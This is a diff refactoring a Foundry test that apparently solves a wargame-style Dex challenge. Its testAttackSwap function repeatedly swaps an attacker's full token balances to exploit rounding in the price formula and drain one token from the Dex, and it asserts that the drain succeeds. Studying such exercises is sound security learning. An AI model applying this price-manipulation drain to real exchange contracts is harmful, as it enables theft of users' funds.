@@ -12,46 +12,41 @@ contract TestDex is Test {
     address public token2;
 
     function setUp() public {
-        Dex dex = new Dex();
+        dex = new Dex();
 
         // Deploy two SwappableToken contracts with initial supply
-        SwappableToken token1 = new SwappableToken(
-            address(dex),
-            "Token 1",
-            "T1",
-            110 ether
+        token1 = address(
+            new SwappableToken(address(dex), "Token 1", "T1", 110 ether)
         );
 
-        SwappableToken token2 = new SwappableToken(
-            address(dex),
-            "Token 2",
-            "T2",
-            110 ether
+        token2 = address(
+            new SwappableToken(address(dex), "Token 2", "T2", 110 ether)
         );
 
         // Set tokens for the Dex contract
         dex.setTokens(address(token1), address(token2));
 
         // Transfer initial liquidity to Dex contract
-        token1.transfer(address(dex), 100 ether);
-        token2.transfer(address(dex), 100 ether);
-        token1.transfer(ATTACKER, 10 ether);
-        token2.transfer(ATTACKER, 10 ether);
+        SwappableToken(token1).transfer(address(dex), 100 ether);
+        SwappableToken(token2).transfer(address(dex), 100 ether);
+        SwappableToken(token1).transfer(ATTACKER, 10 ether);
+        SwappableToken(token2).transfer(ATTACKER, 10 ether);
     }
-    function test_initialize_state() public view {
+    function testInitializeState() public view {
         assertEq(dex.balanceOf(token1, address(dex)), 100 ether);
         assertEq(dex.balanceOf(token2, address(dex)), 100 ether);
         assertEq(dex.balanceOf(token1, ATTACKER), 10 ether);
         assertEq(dex.balanceOf(token2, ATTACKER), 10 ether);
     }
-    function test_attack_swap() public {
+
+    function testAttackSwap() public {
         for (uint256 i = 0; i < 2; i++) {
             console.log("Iteration:", i);
-            swap_all_tokens_1();
-            swap_all_tokens_2();
+            swapAllTokens1();
+            swapAllTokens2();
         }
         console.log("final iteration");
-        swap_all_tokens_1();
+        swapAllTokens1();
         vm.prank(ATTACKER);
         dex.approve(address(dex), 110 ether);
         uint256 amountToSwap = dex.balanceOf(token2, address(dex));
@@ -71,7 +66,7 @@ contract TestDex is Test {
         );
         assertEq(dex.balanceOf(token1, address(dex)), 0);
     }
-    function swap_all_tokens_1() public {
+    function swapAllTokens1() public {
         vm.prank(ATTACKER);
         dex.approve(address(dex), 110 ether);
         uint256 balanceOfToken1 = dex.balanceOf(token1, ATTACKER);
@@ -81,7 +76,7 @@ contract TestDex is Test {
         console.log("balance of token 1", dex.balanceOf(token1, ATTACKER));
         console.log("balance of token 2", dex.balanceOf(token2, ATTACKER));
     }
-    function swap_all_tokens_2() public {
+    function swapAllTokens2() public {
         vm.prank(ATTACKER);
         dex.approve(address(dex), 110 ether);
         uint256 balanceOfToken2 = dex.balanceOf(token2, ATTACKER);
